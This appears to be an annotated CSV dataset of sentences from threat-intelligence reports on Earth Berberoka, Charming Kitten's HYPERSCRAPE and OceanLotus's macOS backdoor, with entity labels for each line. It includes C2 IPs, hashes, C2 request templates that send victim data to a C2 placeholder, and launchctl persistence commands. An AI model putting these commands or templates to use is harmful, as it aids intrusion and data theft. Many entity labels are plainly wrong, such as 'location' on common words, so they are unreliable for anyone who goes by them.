,text,entities,relations,Comments,id,label,start_offset,end_offset
7122,"Based on our analysis, this group targets gambling websites.",[],[],[],0.0,safe,0.0,0.0
7123,"Our investigation has also uncovered that Earth Berberoka targets the Windows, Linux, and macOS platforms, and uses malware families that have been historically attributed to Chinese-speaking individuals.","[{'id': 28972, 'label': 'threat-actor', 'start_offset': 42, 'end_offset': 57}, {'id': 28973, 'label': 'location', 'start_offset': 86, 'end_offset': 89}, {'id': 28974, 'label': 'location', 'start_offset': 107, 'end_offset': 110}]",[],[],28972.0,threat-actor,42.0,57.0
7124,"This malware lineup includes tried-and-tested malware families that have been upgraded, such as PlugX and Gh0st RAT, and a brand-new multistage malware family that we have dubbed PuppetLoader.","[{'id': 28978, 'label': 'location', 'start_offset': 35, 'end_offset': 38}, {'id': 28979, 'label': 'malware', 'start_offset': 96, 'end_offset': 101}, {'id': 28980, 'label': 'location', 'start_offset': 102, 'end_offset': 105}, {'id': 28981, 'label': 'malware', 'start_offset': 106, 'end_offset': 115}, {'id': 28982, 'label': 'location', 'start_offset': 117, 'end_offset': 120}, {'id': 28983, 'label': 'location', 'start_offset': 123, 'end_offset': 128}, {'id': 28984, 'label': 'malware', 'start_offset': 179, 'end_offset': 191}]",[],[],28978.0,location,35.0,38.0
7125," We discuss the full technical details of Earth Berberoka’s malware families aimed at Linux and macOS as well as Windows, infection vectors, targets, and possible connections with other APT groups in our research paper “Operation Earth Berberoka: An Analysis of a Multivector and Multiplatform APT Campaign Targeting Online Gambling Sites.” Technical analysis","[{'id': 28985, 'label': 'threat-actor', 'start_offset': 42, 'end_offset': 57}, {'id': 28986, 'label': 'location', 'start_offset': 92, 'end_offset': 95}, {'id': 28987, 'label': 'location', 'start_offset': 150, 'end_offset': 153}, {'id': 28988, 'label': 'location', 'start_offset': 186, 'end_offset': 189}, {'id': 28989, 'label': 'threat-actor', 'start_offset': 230, 'end_offset': 245}, {'id': 28990, 'label': 'location', 'start_offset': 276, 'end_offset': 279}, {'id': 28991, 'label': 'location', 'start_offset': 294, 'end_offset': 297}, {'id': 28992, 'label': 'location', 'start_offset': 298, 'end_offset': 306}, {'id': 28993, 'label': 'location', 'start_offset': 333, 'end_offset': 338}]",[],[],28985.0,threat-actor,42.0,57.0
7126,PuppetLoader,"[{'id': 28994, 'label': 'malware', 'start_offset': 0, 'end_offset': 12}]",[],[],28994.0,malware,0.0,12.0
7127,We discovered a new malware family that we have dubbed PuppetLoader.,"[{'id': 28995, 'label': 'malware', 'start_offset': 55, 'end_offset': 67}]",[],[],28995.0,malware,55.0,67.0
7128,"In this stage, a blob of payload data is decrypted using a hard-coded key (2726c6aea9970bb95211304705b5f595) and what appears to be an RC4 (Rivest Cipher 4) algorithm.","[{'id': 29001, 'label': 'location', 'start_offset': 59, 'end_offset': 63}, {'id': 29002, 'label': 'MD5', 'start_offset': 75, 'end_offset': 107}, {'id': 29003, 'label': 'location', 'start_offset': 109, 'end_offset': 112}]",[],[],29001.0,location,59.0,63.0
7129,"However, the cipher’s “swap” operation in the pseudorandom generation part of the cipher code was improperly implemented.",[],[],[],0.0,safe,0.0,0.0
7130,"It seems that this hard-coded key and flawed RC4 implementation were also used in a malware family named TigerPlug, probably because it spreads the PlugX malware.","[{'id': 29007, 'label': 'location', 'start_offset': 19, 'end_offset': 23}, {'id': 29008, 'label': 'location', 'start_offset': 34, 'end_offset': 37}, {'id': 29010, 'label': 'malware', 'start_offset': 148, 'end_offset': 153}]",[],[],29007.0,location,19.0,23.0
7131,Hijacking loaded module,[],[],[],0.0,safe,0.0,0.0
7132,"After the payload is decrypted, it is loaded in the machine’s memory and is executed using a stealthy method: PuppetLoader starts by loading a legitimate DLL from the Windows\System32 directory.","[{'id': 29013, 'label': 'location', 'start_offset': 69, 'end_offset': 72}, {'id': 29014, 'label': 'malware', 'start_offset': 110, 'end_offset': 122}]",[],[],29013.0,location,69.0,72.0
7133,"This is done by hooking NTDLL APIs such as NtQueryAttributesFile, NtOpenFile, NtCreateSection, NtMapViewOfSection, NtQuerySection and ZwClose.","[{'id': 29017, 'label': 'attack-pattern', 'start_offset': 16, 'end_offset': 23}, {'id': 29018, 'label': 'location', 'start_offset': 130, 'end_offset': 133}]",[],[],29017.0,attack-pattern,16.0,23.0
7135,"For its command-line parameters, PuppetLoader uses the same flawed RC4 implementation using the password “whk0q9ogev6ofg8d”.","[{'id': 29040, 'label': 'malware', 'start_offset': 33, 'end_offset': 45}, {'id': 29041, 'label': 'location', 'start_offset': 55, 'end_offset': 59}]",[],[],29040.0,malware,33.0,45.0
7136,These hijacking steps result in the following:  ,[],[],[],0.0,safe,0.0,0.0
7137,        Figure 2. asycfilt.dll shown among loaded module names      lz32.dll is opened based on process monitoring tools.       Figure 3. lz32.dll shown among opened files      Only PuppetLoader’s dropper payload is loaded and none of the previously mentioned libraries is actually loaded.,"[{'id': 29044, 'label': 'location', 'start_offset': 177, 'end_offset': 181}, {'id': 29045, 'label': 'malware', 'start_offset': 182, 'end_offset': 194}, {'id': 29046, 'label': 'location', 'start_offset': 223, 'end_offset': 226}, {'id': 29047, 'label': 'location', 'start_offset': 227, 'end_offset': 231}]",[],[],29044.0,location,177.0,181.0
7138,Stage 2: Dropper,[],[],[],0.0,safe,0.0,0.0
7139,Table 1.,[],[],[],0.0,safe,0.0,0.0
7140,We believe that it serves as a marker that stage 2 has been completed.,[],[],[],0.0,safe,0.0,0.0
7141,It is interesting to note that there is a typographical error in “-InokeMethodParam.”  ,[],[],[],0.0,safe,0.0,0.0
7142,Stage 3: BasicLoader,[],[],[],0.0,safe,0.0,0.0
7143,Stage 5: Client.MainConsole,[],[],[],0.0,safe,0.0,0.0
7144,"This is the main client binary written in C++, which is the last stage of PuppetLoader’s infection chain.","[{'id': 29101, 'label': 'malware', 'start_offset': 74, 'end_offset': 86}]",[],[],29101.0,malware,74.0,86.0
7145,RemoteModuleCommandPacket,[],[],[],0.0,safe,0.0,0.0
7146,Uploaded file content FileManage_FolderContent_Packet Folder content VecProcessPacket Vector object with running processes InstallModulePacket BMP with encrypted module to be installed,"[{'id': 29111, 'label': 'location', 'start_offset': 14, 'end_offset': 21}, {'id': 29112, 'label': 'location', 'start_offset': 61, 'end_offset': 68}, {'id': 29113, 'label': 'tools', 'start_offset': 86, 'end_offset': 92}]",[],[],29111.0,location,14.0,21.0
7148,The custom UDP packets recognized by the client,[],[],[],0.0,safe,0.0,0.0
7149,Install module Login callback Enumerate RDP sessions,"[{'id': 29120, 'label': 'malware', 'start_offset': 40, 'end_offset': 43}]",[],[],29120.0,malware,40.0,43.0
7150,oRAT,"[{'id': 29124, 'label': 'malware', 'start_offset': 0, 'end_offset': 4}]",[],[],29124.0,malware,0.0,4.0
7151,Another malware family that we obtained both Windows and macOS samples of during our investigation was oRAT.,"[{'id': 29125, 'label': 'location', 'start_offset': 53, 'end_offset': 56}, {'id': 29126, 'label': 'malware', 'start_offset': 103, 'end_offset': 107}]",[],[],29125.0,location,53.0,56.0
7152,The oRAT droppers that we found in our analysis were a MiMi chat application built using the Electron JS framework and a DMG (disk image) file.,"[{'id': 29130, 'label': 'malware', 'start_offset': 4, 'end_offset': 8}, {'id': 29131, 'label': 'location', 'start_offset': 60, 'end_offset': 64}, {'id': 29132, 'label': 'location', 'start_offset': 93, 'end_offset': 101}, {'id': 29133, 'label': 'location', 'start_offset': 115, 'end_offset': 118}]",[],[],29130.0,malware,4.0,8.0
7153,We discuss the full details of both in our research paper.,[],[],[],0.0,safe,0.0,0.0
7155,The decrypted oRAT configuration     The configuration is decrypted using the AES-GCM (AES with Galois/Counter Mode) algorithm.,"[{'id': 29142, 'label': 'malware', 'start_offset': 14, 'end_offset': 18}, {'id': 29143, 'label': 'location', 'start_offset': 111, 'end_offset': 115}]",[],[],29142.0,malware,14.0,18.0
7156,The control server is implemented by registering routes.,[],[],[],0.0,safe,0.0,0.0
7157,Requesting a URL therefore results in executing the corresponding code on an infected system.,[],[],[],0.0,safe,0.0,0.0
7158,We obtained oRAT samples that register these routes:   GET /agent/info GET /agent/ping POST /agent/upload GET /agent/download GET /agent/screenshot GET /agent/zip GET /agent/unzip GET /agent/kill-self GET /agent/portscan GET /agent/proxy GET /agent/ssh GET /agent/net  PuppetDownloaders (C++ downloaders),"[{'id': 29155, 'label': 'malware', 'start_offset': 12, 'end_offset': 16}, {'id': 29156, 'label': 'location', 'start_offset': 30, 'end_offset': 38}, {'id': 29157, 'label': 'tools', 'start_offset': 82, 'end_offset': 86}, {'id': 29158, 'label': 'location', 'start_offset': 87, 'end_offset': 91}, {'id': 29159, 'label': 'malware', 'start_offset': 212, 'end_offset': 220}, {'id': 29160, 'label': 'malware', 'start_offset': 264, 'end_offset': 267}]",[],[],29155.0,malware,12.0,16.0
7159,"During our investigation, we also saw malicious websites that distribute fake Adobe Flash Player updates that were actually delivering C++ downloaders.",[],[],[],0.0,safe,0.0,0.0
7160,The infection starts with an executable written in C++ that connects through a Winsock API to a domain or IP address in a specific port.,[],[],[],0.0,safe,0.0,0.0
7161,"If the SMTemp.dat file exists, the Loader.dll file executes it.",[],[],[],0.0,safe,0.0,0.0
7162,"During our investigation, we noted that the server hosting the second stage of the PuppetDownloaders malware payload was offline.",[],[],[],0.0,safe,0.0,0.0
7163,     Figure 7.  XOR decryption routine      ,[],[],[],0.0,safe,0.0,0.0
7164,"We dubbed these downloaders PuppetDownloaders since they are connected to the PuppetLoader malware family, as evidenced by our observations:  This malware and PuppetLoader both use the same string decryption routine that uses the same key.","[{'id': 29179, 'label': 'location', 'start_offset': 57, 'end_offset': 60}, {'id': 29180, 'label': 'malware', 'start_offset': 78, 'end_offset': 90}, {'id': 29181, 'label': 'location', 'start_offset': 155, 'end_offset': 158}, {'id': 29183, 'label': 'location', 'start_offset': 185, 'end_offset': 189}, {'id': 29184, 'label': 'location', 'start_offset': 230, 'end_offset': 234}]",[],[],29179.0,location,57.0,60.0
7165,This malware and PuppetLoader both use the same XOR key (2726c6aea9970bb95211304705b5f595) that is used to decrypt the embedded Loader.dll file.,"[{'id': 29185, 'label': 'location', 'start_offset': 13, 'end_offset': 16}, {'id': 29187, 'label': 'location', 'start_offset': 43, 'end_offset': 47}, {'id': 29188, 'label': 'MD5', 'start_offset': 57, 'end_offset': 89}]",[],[],29185.0,location,13.0,16.0
7166,This malware and PuppetLoader’s decrypted Loader.dlls share similar strings such as “[-] UnExist pwszModuleFunName:”.,"[{'id': 29189, 'label': 'location', 'start_offset': 13, 'end_offset': 16}, {'id': 29190, 'label': 'malware', 'start_offset': 17, 'end_offset': 29}]",[],[],29189.0,location,13.0,16.0
7167,This suggests that a common framework was used to compile both DLLs.,[],[],[],0.0,safe,0.0,0.0
7168, MFC socket downloaders,[],[],[],0.0,safe,0.0,0.0
7169,We also saw WinRAR self-extracting (SFX) files dropping downloaders written using the Microsoft Foundation Class Library (MFC) framework.,"[{'id': 29191, 'label': 'malware', 'start_offset': 12, 'end_offset': 18}, {'id': 29192, 'label': 'identity', 'start_offset': 86, 'end_offset': 95}, {'id': 29193, 'label': 'location', 'start_offset': 113, 'end_offset': 120}]",[],[],29191.0,malware,12.0,18.0
7170,"However, it is possible that multiple groups might be covertly sharing the source code for this malware.","[{'id': 29212, 'label': 'attack-pattern', 'start_offset': 75, 'end_offset': 81}]",[],[],29212.0,attack-pattern,75.0,81.0
7171,"This malware family sends a DWORD, a 32-bit unsigned integer, in the HELLO packet.",[],[],[],0.0,safe,0.0,0.0
7172,Gh0st RAT,"[{'id': 29237, 'label': 'malware', 'start_offset': 0, 'end_offset': 9}]",[],[],29237.0,malware,0.0,9.0
7173,"We also saw at least three different variants of Gh0st RAT, another malware family that has been in the wild for more than 10 years, being used in Earth Berberoka’s campaign.","[{'id': 29239, 'label': 'malware', 'start_offset': 49, 'end_offset': 58}, {'id': 29242, 'label': 'location', 'start_offset': 165, 'end_offset': 173}]",[],[],29239.0,malware,49.0,58.0
7174,"This malware family’s source code is public, which is why it has many variants.","[{'id': 29243, 'label': 'attack-pattern', 'start_offset': 22, 'end_offset': 28}, {'id': 29244, 'label': 'location', 'start_offset': 37, 'end_offset': 43}, {'id': 29245, 'label': 'location', 'start_offset': 65, 'end_offset': 69}]",[],[],29243.0,attack-pattern,22.0,28.0
7175,One of the variants we analyzed had an interesting destructive feature: It replaces the master boot record (MBR) to display an explicit message (“I am virus ! F*ck you :-)”).,[],[],[],0.0,safe,0.0,0.0
7176,A 2017 Industrial Control Systems Cyber Emergency Response Team (ICS-CERT) report also discussed how Gh0st RAT variants wiped the MBR and replaced it with messages that varied across different samples.,"[{'id': 29250, 'label': 'location', 'start_offset': 7, 'end_offset': 17}, {'id': 29251, 'label': 'malware', 'start_offset': 101, 'end_offset': 110}, {'id': 29252, 'label': 'location', 'start_offset': 134, 'end_offset': 137}]",[],[],29250.0,location,7.0,17.0
7177,Other Known Malware Families,[],[],[],0.0,safe,0.0,0.0
7178,We also found other legitimate tools being abused by Earth Berberoka and a malware family being used by the group in its campaign:  Quasar RAT – a Windows-based open-source RAT that has been used by APT groups for network exploitation,"[{'id': 29253, 'label': 'threat-actor', 'start_offset': 53, 'end_offset': 68}, {'id': 29254, 'label': 'location', 'start_offset': 69, 'end_offset': 72}, {'id': 29255, 'label': 'location', 'start_offset': 121, 'end_offset': 129}, {'id': 29256, 'label': 'malware', 'start_offset': 132, 'end_offset': 142}, {'id': 29257, 'label': 'attack-pattern', 'start_offset': 166, 'end_offset': 172}, {'id': 29258, 'label': 'location', 'start_offset': 199, 'end_offset': 202}]",[],[],29253.0,threat-actor,53.0,68.0
7179,AsyncRAT – an open-source RAT that can be used to remotely monitor and control devices via an encrypted connection Trochilus – a stealthy RAT that can evade sandbox analysis and can be used in cyberespionage campaigns  Security recommendations,"[{'id': 29259, 'label': 'malware', 'start_offset': 0, 'end_offset': 8}, {'id': 29260, 'label': 'attack-pattern', 'start_offset': 19, 'end_offset': 25}, {'id': 29261, 'label': 'location', 'start_offset': 35, 'end_offset': 38}, {'id': 29262, 'label': 'location', 'start_offset': 59, 'end_offset': 66}, {'id': 29263, 'label': 'location', 'start_offset': 67, 'end_offset': 70}, {'id': 29264, 'label': 'malware', 'start_offset': 115, 'end_offset': 124}, {'id': 29265, 'label': 'location', 'start_offset': 147, 'end_offset': 150}, {'id': 29266, 'label': 'location', 'start_offset': 174, 'end_offset': 177}, {'id': 29267, 'label': 'location', 'start_offset': 178, 'end_offset': 181}, {'id': 29268, 'label': 'location', 'start_offset': 219, 'end_offset': 227}]",[],[],29259.0,malware,0.0,8.0
7180,"In December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!, and Microsoft Outlook accounts.","[{'id': 29310, 'label': 'threat-actor', 'start_offset': 41, 'end_offset': 56}, {'id': 29311, 'label': 'location', 'start_offset': 57, 'end_offset': 61}, {'id': 29315, 'label': 'location', 'start_offset': 126, 'end_offset': 129}]",[],[],29310.0,threat-actor,41.0,56.0
7183,HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.,"[{'id': 29333, 'label': 'threat-actor', 'start_offset': 25, 'end_offset': 40}, {'id': 29334, 'label': 'location', 'start_offset': 68, 'end_offset': 71}]",[],[],29333.0,threat-actor,25.0,40.0
7184,"Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives.","[{'id': 29335, 'label': 'location', 'start_offset': 5, 'end_offset': 9}, {'id': 29337, 'label': 'threat-actor', 'start_offset': 135, 'end_offset': 150}]",[],[],29335.0,location,5.0,9.0
7188,GET http://{C2}/Index.php?Ck=OK HTTP/1.1,"[{'id': 29366, 'label': 'URL', 'start_offset': 4, 'end_offset': 28}]",[],[],29366.0,URL,4.0,28.0
7192,GET http://{C2}/Index.php?vubc={identity} HTTP/1.1,"[{'id': 29372, 'label': 'URL', 'start_offset': 4, 'end_offset': 40}]",[],[],29372.0,URL,4.0,40.0
7195,"If the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page.","[{'id': 29382, 'label': 'malware', 'start_offset': 64, 'end_offset': 68}, {'id': 29383, 'label': 'location', 'start_offset': 82, 'end_offset': 85}, {'id': 29384, 'label': 'location', 'start_offset': 99, 'end_offset': 102}, {'id': 29385, 'label': 'location', 'start_offset': 112, 'end_offset': 117}, {'id': 29386, 'label': 'location', 'start_offset': 157, 'end_offset': 161}, {'id': 29387, 'label': 'location', 'start_offset': 192, 'end_offset': 196}]",[],[],29382.0,malware,64.0,68.0
7200,"POST http://{C2}/?Key={GUID}&Crc={Identifier} { ""appName"": ""Gmail Downloader"", ""targetname"": ""{Email}"", ""HostName"": ""REDACTED"", ""srcUserIP"": ""REDACTED"", ""actionType"": ""First"", ""timeOccurrence"": ""05/01/2022 05:50:31 PM"", ""OS"": ""REDACTED"", ""OSVersion"": ""REDACTED"", ""SystemModel"": ""REDACTED"", ""SystemType"": ""REDACTED"", ""srcName"": ""REDACTED"", ""srcOrgName"": ""REDACTED"" }","[{'id': 29396, 'label': 'location', 'start_offset': 0, 'end_offset': 4}, {'id': 29397, 'label': 'URL', 'start_offset': 5, 'end_offset': 44}, {'id': 29399, 'label': 'TIME', 'start_offset': 206, 'end_offset': 217}]",[],[],29396.0,location,0.0,4.0
7205,"public void ManageTakeOut() { string text = ""PipeName"";","[{'id': 29425, 'label': 'location', 'start_offset': 0, 'end_offset': 6}, {'id': 29426, 'label': 'malware', 'start_offset': 7, 'end_offset': 11}]",[],[],29425.0,location,0.0,6.0
7208,We’ll also continue to apply those findings internally to improve the safety and security of our products so we can effectively combat threats and protect users who rely on our services.,"[{'id': 29454, 'label': 'tools', 'start_offset': 70, 'end_offset': 76}, {'id': 29455, 'label': 'location', 'start_offset': 77, 'end_offset': 80}, {'id': 29456, 'label': 'location', 'start_offset': 81, 'end_offset': 89}, {'id': 29457, 'label': 'location', 'start_offset': 112, 'end_offset': 115}, {'id': 29458, 'label': 'location', 'start_offset': 143, 'end_offset': 146}]",[],[],29454.0,tools,70.0,76.0
7209,"In the meantime, we encourage high risk users to enroll in our Advanced Protection Program (APP) and utilize Google Account Level Enhanced Safe Browsing to ensure they have the greatest level of protection in the face of ongoing threats.","[{'id': 29459, 'label': 'location', 'start_offset': 72, 'end_offset': 82}, {'id': 29460, 'label': 'location', 'start_offset': 97, 'end_offset': 100}, {'id': 29461, 'label': 'threat-actor', 'start_offset': 139, 'end_offset': 143}, {'id': 29462, 'label': 'location', 'start_offset': 195, 'end_offset': 205}]",[],[],29459.0,location,72.0,82.0
7210,C2s 136.243.108.14 173.209.51.54 HYPERSCRAPE binaries 03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e369 35a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b89208 5afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca798 6dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f 767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4 977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85f ac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6 cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa,"[{'id': 29463, 'label': 'IPV4', 'start_offset': 4, 'end_offset': 18}, {'id': 29464, 'label': 'IPV4', 'start_offset': 19, 'end_offset': 32}, {'id': 29465, 'label': 'SHA1', 'start_offset': 54, 'end_offset': 118}, {'id': 29466, 'label': 'SHA1', 'start_offset': 119, 'end_offset': 183}, {'id': 29467, 'label': 'SHA1', 'start_offset': 184, 'end_offset': 248}, {'id': 29468, 'label': 'SHA1', 'start_offset': 249, 'end_offset': 313}, {'id': 29469, 'label': 'SHA2', 'start_offset': 314, 'end_offset': 378}, {'id': 29470, 'label': 'SHA1', 'start_offset': 379, 'end_offset': 443}, {'id': 29471, 'label': 'SHA1', 'start_offset': 444, 'end_offset': 508}, {'id': 29472, 'label': 'SHA1', 'start_offset': 509, 'end_offset': 573}]",[],[],29463.0,IPV4,4.0,18.0
7211,Microsoft Live DLL 1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23 PDB E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\EmailDownloader\obj\Debug\EmailDownloader.pdb,"[{'id': 29473, 'label': 'identity', 'start_offset': 0, 'end_offset': 9}, {'id': 29474, 'label': 'SHA1', 'start_offset': 19, 'end_offset': 83}]",[],[],29473.0,identity,0.0,9.0
7212,E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\Mahdi\LiveLib\obj\Release\LiveLib.pdb,[],[],[],0.0,safe,0.0,0.0
7213,"We identified a MacOS backdoor (detected by Trend Micro as  OSX_OCEANLOTUS.D) that we believe is the latest version of a threat used by OceanLotus (a.k.a. APT 32, APT-C-00, SeaLotus, and Cobalt Kitty).","[{'id': 29476, 'label': 'malware', 'start_offset': 60, 'end_offset': 76}, {'id': 29478, 'label': 'threat-actor', 'start_offset': 155, 'end_offset': 161}, {'id': 29481, 'label': 'location', 'start_offset': 183, 'end_offset': 186}]",[],[],29476.0,malware,60.0,76.0
7214,The attackers behind OSX_OCEANLOTUS.D target MacOS computers which have the Perl programming language installed.,"[{'id': 29488, 'label': 'malware', 'start_offset': 21, 'end_offset': 37}, {'id': 29489, 'label': 'location', 'start_offset': 38, 'end_offset': 44}, {'id': 29490, 'label': 'location', 'start_offset': 76, 'end_offset': 80}]",[],[],29488.0,malware,21.0,37.0
7215,The MacOS backdoor was found in a malicious Word document presumably distributed via email.,[],[],[],0.0,safe,0.0,0.0
7216, Figure 1. Graphic used by the malicious document,[],[],[],0.0,safe,0.0,0.0
7217,"Upon receiving the malicious document, the user is advised to enable macros.",[],[],[],0.0,safe,0.0,0.0
7218,"In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code.",[],[],[],0.0,safe,0.0,0.0
7219,This is shown in the figure below.,[],[],[],0.0,safe,0.0,0.0
7221,Code snippet of the obfuscated document,[],[],[],0.0,safe,0.0,0.0
7222,It extracts theme0.xml file from the Word document.,[],[],[],0.0,safe,0.0,0.0
7223,"theme0.xml is a Mach-O 32-bit executable with a  0xFEEDFACE signature that is also the dropper of the backdoor, which is the final payload.","[{'id': 29505, 'label': 'location', 'start_offset': 16, 'end_offset': 20}, {'id': 29506, 'label': 'identity', 'start_offset': 26, 'end_offset': 29}]",[],[],29505.0,location,16.0,20.0
7224,theme0.xml is extracted to /tmp/system/word/theme/syslogd before it’s executed.,[],[],[],0.0,safe,0.0,0.0
7225, Figure 3. Deobfuscated Perl payload from the delivery document Dropper analysis,[],[],[],0.0,safe,0.0,0.0
7227,The main function of the dropper,[],[],[],0.0,safe,0.0,0.0
7228, Figure 5. Hardcoded RSA256 key showing the first 20 characters,[],[],[],0.0,safe,0.0,0.0
7229,The locations:,[],[],[],0.0,safe,0.0,0.0
7230,For regular user   path: ~/Library/Spelling/ processname: spellagentd,[],[],[],0.0,safe,0.0,0.0
7231," Subsequently, it implements the Loader::installLoader method, reading the hardcoded 64-bit Mach-O executable (magic value 0xFEEDFACF), and writing to the previously determined path and file.","[{'id': 29523, 'label': 'location', 'start_offset': 63, 'end_offset': 70}, {'id': 29524, 'label': 'identity', 'start_offset': 88, 'end_offset': 91}, {'id': 29525, 'label': 'location', 'start_offset': 92, 'end_offset': 96}, {'id': 29526, 'label': 'location', 'start_offset': 136, 'end_offset': 139}, {'id': 29527, 'label': 'location', 'start_offset': 182, 'end_offset': 185}]",[],[],29523.0,location,63.0,70.0
7233,The magic value 0xFEEDFACF that belongs to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return the hardcoded name of the property list “.plist” for the root user (com.apple.screen.assistantd.plist) and for the regular user (com.apple.spell.agent.plist).,"[{'id': 29539, 'label': 'location', 'start_offset': 43, 'end_offset': 47}, {'id': 29540, 'label': 'identity', 'start_offset': 65, 'end_offset': 68}, {'id': 29541, 'label': 'location', 'start_offset': 93, 'end_offset': 96}, {'id': 29542, 'label': 'location', 'start_offset': 111, 'end_offset': 115}, {'id': 29543, 'label': 'location', 'start_offset': 158, 'end_offset': 162}, {'id': 29544, 'label': 'location', 'start_offset': 180, 'end_offset': 184}, {'id': 29545, 'label': 'location', 'start_offset': 226, 'end_offset': 229}]",[],[],29539.0,location,43.0,47.0
7235,Property list with persistence settings launchctl load /Library/LaunchDaemons/filename.plist > /dev/nul or launchctl load ~/Library/LaunchAgents/ filename.plist > /dev/nul will then command the operating system to start the dropped backdoor file at login.,"[{'id': 29553, 'label': 'location', 'start_offset': 9, 'end_offset': 13}, {'id': 29554, 'label': 'attack-pattern', 'start_offset': 40, 'end_offset': 49}, {'id': 29555, 'label': 'location', 'start_offset': 50, 'end_offset': 54}, {'id': 29556, 'label': 'attack-pattern', 'start_offset': 107, 'end_offset': 116}, {'id': 29557, 'label': 'location', 'start_offset': 117, 'end_offset': 121}, {'id': 29558, 'label': 'location', 'start_offset': 172, 'end_offset': 176}, {'id': 29559, 'label': 'location', 'start_offset': 214, 'end_offset': 219}]",[],[],29553.0,location,9.0,13.0
7236,Backdoor analysis,[],[],[],0.0,safe,0.0,0.0
7237,"Meanwhile, runHandle is responsible for the backdoor capabilities.",[],[],[],0.0,safe,0.0,0.0
7239,The main functions of the backdoor infoClient fills up the variables in HandlePP class.,[],[],[],0.0,safe,0.0,0.0
7241,The HandlePP::getClientID method uses the following environment variables:  Figure 11. Serial number  Figure 12.,[],[],[],0.0,safe,0.0,0.0
7242,Hardware UUID  Figure 13.,[],[],[],0.0,safe,0.0,0.0
7243,MAC address  Figure 14.,[],[],[],0.0,safe,0.0,0.0
7244,Randomly generated UUID,[],[],[],0.0,safe,0.0,0.0
7245,"For the initial information packet, the backdoor also collects the following:  Figure 15.",[],[],[],0.0,safe,0.0,0.0
7247,Parser::inBytes method,[],[],[],0.0,safe,0.0,0.0
7248,"If clientID equals the following sequence of bytes B4 B1 47 BC 52 28 28 73 1F 1A 01 6B FA 72 C0 73, then the scrambled version is computed using the third parameter (0x10), which is treated as a DWORD.",[],[],[],0.0,safe,0.0,0.0
7249,"Each quadruple of bytes is XOR-ed with it, as shown in example below.",[],[],[],0.0,safe,0.0,0.0
7250,   Figure 17.,[],[],[],0.0,safe,0.0,0.0
7251,Parser::inByte method,[],[],[],0.0,safe,0.0,0.0
7252,Figure 18.,[],[],[],0.0,safe,0.0,0.0
7253,Parser::inString method,[],[],[],0.0,safe,0.0,0.0
7254,Let’s say we want to scramble string ‘Mac OSX 10.12.’,[],[],[],0.0,safe,0.0,0.0
7255, The final 5-byte sequence looks like F3 00 00 00 92 0D.,[],[],[],0.0,safe,0.0,0.0
7256,The original string is then XOR’ed with the 5-byte sequence.,[],[],[],0.0,safe,0.0,0.0
7257, Figure 19.,[],[],[],0.0,safe,0.0,0.0
7258,Scrambling ‘Mac OSX 10.12’ Encryption,[],[],[],0.0,safe,0.0,0.0
7259,Encoding the encryption key,[],[],[],0.0,safe,0.0,0.0
7260,"However, this key is also scrambled with operation XOR 0x13 followed by ROL 6 operation applied to each byte.",[],[],[],0.0,safe,0.0,0.0
7261, Figure 20. Function for scrambling AES256 key in the outgoing packet,[],[],[],0.0,safe,0.0,0.0
7262,The highlighted bytes represent the scrambled computer info  Figure 22.,[],[],[],0.0,safe,0.0,0.0
7263,"Randomly generated AES256 key  Figure 23. Scrambled AES256 key (0xC1 XOR 0x13 = 0xD2, 0xD2 ROL 6 = 0xB4) etc.)",[],[],[],0.0,safe,0.0,0.0
7264, Figure 24.,[],[],[],0.0,safe,0.0,0.0
